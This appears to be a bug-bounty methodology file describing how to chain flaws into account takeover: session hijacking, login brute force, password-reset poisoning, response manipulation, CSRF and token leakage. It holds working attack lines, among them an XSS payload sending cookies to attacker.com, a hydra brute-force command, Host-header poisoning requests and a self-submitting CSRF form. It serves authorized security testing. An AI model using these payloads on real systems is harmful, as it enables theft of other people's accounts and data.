# Account Takeover Methodologies

Account Takeover (ATO) means reading or modifying another user's account without their credentials. It is the highest-frequency "critical" in bug bounty programs because it combines auth, session, reset, and input-handling flaws into a single business-impacting outcome. Typical severity: P1–P2 when proven on a victim-controlled account.

This file is a *chaining playbook*: each technique below is a link you combine with a smaller finding (XSS, missing rate limit, response trust, token leak) to reach full ATO.

## Hunting Checklist

1. Start from the three ATO entry points: login, password reset, and email/username change.
2. Check session lifetime: can cookies survive logout, password change, or account deletion? Pair any XSS you find with cookie theft.
3. Check credential-entry defenses: rate limiting on login, weak password policy, lockout scope.
4. Poison the reset flow: inject a foreign `Host` / `X-Forwarded-Host` / `Referrer` into the forgot-password request and see where the reset link points.
5. Test trust boundaries: does any client consume server responses it shouldn't (auth/OTP "false" flipped to "true")?
6. Test every state-changing auth operation (change password, change email, security questions, MFA disable) for CSRF.
7. Intercept responses of registration and password-reset requests for tokens/OTP/links reflected in the body.
8. Chain everything: low-sev leak + missing expiry + CSRF = ATO report.

## Test Cases & Examples

### 1. Chaining Session Hijacking with XSS
1. Note the session-hijacking behavior in `Broken_Auth_And_Session_Management/Session_based_bugs.md` (cookies valid after logout).
2. If the same target has XSS, the impact ceiling rises: XSS is no longer "just" XSS.
3. Fire a cookie-stealing payload on a logged-in victim:
```html
<img src=x onerror="fetch('https://attacker.com/c?d='+document.cookie)">
```
4. Replay the stolen cookie to take over the victim's session.

### 2. No Rate Limit on Login + Weak Password Policy
1. Confirm the app enforces no minimum password complexity (accepts `123456`).
2. Create your own account with a weak password and prove login has no rate limit/lockout.
3. PoC by brute-forcing *your own* account to show an attacker could do the same against any user:
```bash
hydra -l victim@example.com -P top1000.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:invalid"
```
- Note: some programs treat "no rate limit" alone as acceptable risk — pair it with the weak policy in the impact statement (may or may not be accepted).

### 3. Password Reset Poisoning → Token Theft
1. Open the forgot-password function and intercept the request.
2. Swap the `Host` header to your controlled domain:
```http
POST /api/forgot-password HTTP/1.1
Host: attacker.com
Content-Type: application/json

{"email":"victim@example.com"}
```
3. If not, add poisoning headers *without* touching `Host`:
```http
X-Forwarded-Host: evil.com
Referer: https://evil.com
```
4. Forward the request. If the reset email now contains `attacker.com`/`evil.com`, the reset token is delivered to you → full ATO.

### 4. Auth Bypass via Response Manipulation
Wrong code/password flows that only the *client* judges:
1. Enter a wrong auth code / password; capture the response in Burp (Repeater).
2. Edit the response before it reaches the browser:
```json
{"code":"invalid_credentials"}  →  {"code":"valid_credentials"}
{"verify":"false"}              →  {"verify":"true"}
```
3. If the app proceeds to an authenticated state, ATO is possible for any account (see `MFA_Bypasses/2FA_Bypass.md` for the 2FA variant).

### 5. CSRF on Account-Linking Operations
Test for missing anti-CSRF tokens on:
- Change Password
- Change Email
- Change Security Questions
- Enable/Disable 2FA, delete account, add device

Example HTML PoC (email change):
```html
<form action="https://target.com/api/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit();</script>
```
Email-change CSRF → password reset to the attacker's address → ATO.

### 6. Token / OTP Leakage in Responses
Multiple routes share the same root cause: the server echoes the secret it just emailed/texted.

Registration:
1. Intercept the signup request containing your data.
2. Burp → Action → "Do intercept" → response to this request → forward.
3. Check the response body for any verification link, token, or OTP.

Password reset:
1. Intercept the forgot-password request the same way.
2. Check the response for a reset link/token/OTP — if present, anyone who can trigger the flow can complete it without touching the victim's mailbox → ATO.

## Bypass Techniques

- Combine poisoning vectors: `Host`, `X-Forwarded-Host`, `X-Forwarded-For`, `Referer`, absolute `Return-Path`-style params, and email-parameter pollution (see `Password_Reset_Functionality/`).
- If the reset token is bound to the session, drop cookies on the reset page and observe whether binding actually matters to your chain.
- Response manipulation works best when the check is in a SPA/frontend — try Match-and-Replace rules so the bypass survives page refreshes during the PoC.

## Tools & Resources

- Burp Suite (Proxy, Repeater, Intruder, Match-and-Replace), Hydra for credential PoCs.
- [An Account Takeover Vulnerability Due to Response Manipulation – Avanish Pathak](https://avanishpathak.medium.com/an-account-takeover-vulnerability-due-to-response-manipulation-e23fe629bd1)
- Related files in this repo: `Password_Reset_Functionality/`, `MFA_Bypasses/2FA_Bypass.md`, `Authentication_Bypass/OTP_Bypass.md`, `Broken_Auth_And_Session_Management/Session_based_bugs.md`, `CSRF/CSRF.md`, `XSS/Xss.md`.

## Report Tips

- Always demonstrate on a *victim* account you control (second account) and end the chain at attacker-winner state (e.g., reading victim's private data), not just "header changed".
- State the preconditions honestly: what an attacker needs (email only? one click?) — triage downgrades chains that require the victim's own session.
- Rate-limit + weak-policy combos land better when quantified: "N passwords/sec sustained for M minutes with no lockout".

## Credits

- [@Virdoex_hunter](https://twitter.com/Virdoex_hunter), [@v3daxt](https://twitter.com/v3daxt); sources: Google/Twitter/Medium.
